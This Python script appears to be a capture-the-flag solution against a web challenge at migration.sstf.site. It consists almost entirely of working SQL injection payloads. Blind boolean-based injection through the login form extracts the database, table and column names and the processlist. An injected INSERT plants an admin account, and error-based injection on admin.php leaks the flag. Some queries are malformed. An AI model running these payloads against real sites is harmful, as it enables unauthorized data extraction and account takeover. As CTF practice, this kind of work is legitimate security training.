import random
import requests
from bs4 import BeautifulSoup

# true 'or 1
# false 'or 0
# id=__ &pw= __
URL = 'http://migration.sstf.site:5555/'

# database length 'or 1 and length(database())<6#
DB_LEN = 6
def check(data):
    res=requests.post(URL, data=data)
    sp = BeautifulSoup(res.text, 'html.parser')

    if sp.get_text()!='No matched ID':
        return 1

def get_procceslist():
    ps_name=''

    for idx in range(100):
        for a in range(33, 127):
            get_data = {'id':'\'or 1 and ascii(substring((select info from information_schema.processlist limit 0,1), {idx}, 1))={ascii}#'.format(idx=idx, ascii=a), 'pw':'1'}
            if check(get_data):
                ps_name += chr(a)
                print(ps_name)
                break
    print(ps_name)
def get_procceslist_random():
    k = random.randint(1, 1000)
    cookies = {'id':'tmp'+str(k), 'pw':str(k)}
    # print(cookies)

    headers = {'Origin': 'http://migration.sstf.site:5555',
               'Content-Type': 'application/x-www-form-urlencoded',
               'Accept': '*/*',
               'Referer': 'http://migration.sstf.site:5555/migrate.php',
               }
    data = {'id':"",'pw':"1"}



def get_db():
    db_name=''
    for idx in range(10):
        for a in range(33, 127):
            get_data = {'id':'\'or 1 and ascii(substring(database(),{idx}, 1))={ascii}#'.format(idx=idx, ascii=a), 'pw':'1'}
            if check(get_data):
                db_name += chr(a)
                break
    print(db_name)

# Table Length : 6
def get_table_length():
    for a in range(30):
        get_data = {'id':'\'or 1=1 and length((select table_name \
            from information_schema.tables \
            where TABLE_TYPE=\'base table\' \
            and TABLE_SCHEMA=\'{db_name}\' limit 0,1))={length}#'.format(db_name='sitea', length=a)}

        if check(get_data):
            print("Table Length : {n}".format(n=a))
            break
# Table Name = member
def get_table_name():
    table_name=''
    for idx in range(7):
        for a in range(33, 127):
            get_data = {'id':'\'or 1 and ascii(substring((select table_name from information_schema.tables \
                where TABLE_TYPE=\'base table\' and TABLE_SCHEMA=\'{db_name}\' limit 0,1), \
                {idx},1))={ascii}#'.format(db_name='sitea', idx=idx, ascii=a)}
            if check(get_data):
                table_name+=chr(a)
                break
    print(table_name)

# Column : 3자리
def get_col_length():
    for a in range(30):
        get_data = {'id':'\' or 1 and length((select column_name \
            from information_schema.columns \
            where table_name=\'{tb_name}\' limit 0,1))={length}#'.format(tb_name='member', length=a)}
        if check(get_data):
            print("Col length : {n}".format(n=a))
            break

# Column string = 
def get_col_name():
    col_name = ''
    for idx in range(5):
        for a in range(33,127):
            get_data = {'id':'\'or 1 and ascii(substring(select column_name from information_schema.columns \
                where table_name=\'{tb_name}\' limit 0,1), {num}, 1))={ascii}#'.format(tb_name='member', num=idx, ascii=a), 'pw':'1'}
            if check(get_data):
                col_name+=chr(a)
                break
    print(col_name)

def starting_query():
    # select * from information_schema.processlist
    while True:
        get_data = {'id':'\'or 1 and select sitea from information_schema.processlist#', 'pw':'1'}
        res = requests.post(URL, data=get_data)
        print(res.text)


# admin insert -> QUERY : insert into member values(Null, 0, {ID}, {PW}) ==>  (ID : admin , PW : qweqwe2)

def create_admin():
    k = random.randint(1, 1000)
    cookies = {'id':'user'+str(k), 'pw':str(k)}
    print(cookies)
    headers = {'Origin': 'http://migration.sstf.site:5555',
               'Content-Type': 'application/x-www-form-urlencoded',
               'Accept': '*/*', 'Referer': 'http://migration.sstf.site:5555/migrate.php',
               }
    data = {'id': "tmp1\',\'tmp\'), (NULL,1,\'admin\',\'1f048e5fb80c559a4ab4c6e79d940708\')#",'pw':"1"}

    print(data)
    res = requests.post(URL+"/migrate.php", headers=headers, cookies=cookies, data=data)
    print(res)
    print(res.text)

def get_flag():
    cookies = {
        'id': "admin",
        'pw': "qweqwe2"
    }
    headers = {'Origin': 'http://migration.sstf.site:5555',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': '*/*', 'Referer': 'http://migration.sstf.site:5555/migrate.php',
            }
    flag = ""
    for i in range(100):
        for j in range(32, 128):
            data = {"idx":"idx=0 union select 1, 9e307*if((select ord(substr(PW,"+str(i)+",1)) from information)="+str(j)+",1,2)#"}
            # print(data)
            res = requests.post('http://migration.sstf.site:7777/admin.php?mode=log', headers=headers, cookies=cookies, data=data, verify=False)
            if "Log hidden" in res.text:
                print("Good !!!", j)
                flag += chr(j)
                print(flag)
                break




def main():
    get_procceslist()
    # get_db()
    # get_table_length()
    # get_table_name()
    # get_col_length()
    # get_col_name()
    # create_admin()
    # starting_query()
    # get_flag()

if __name__ == "__main__":
    main()

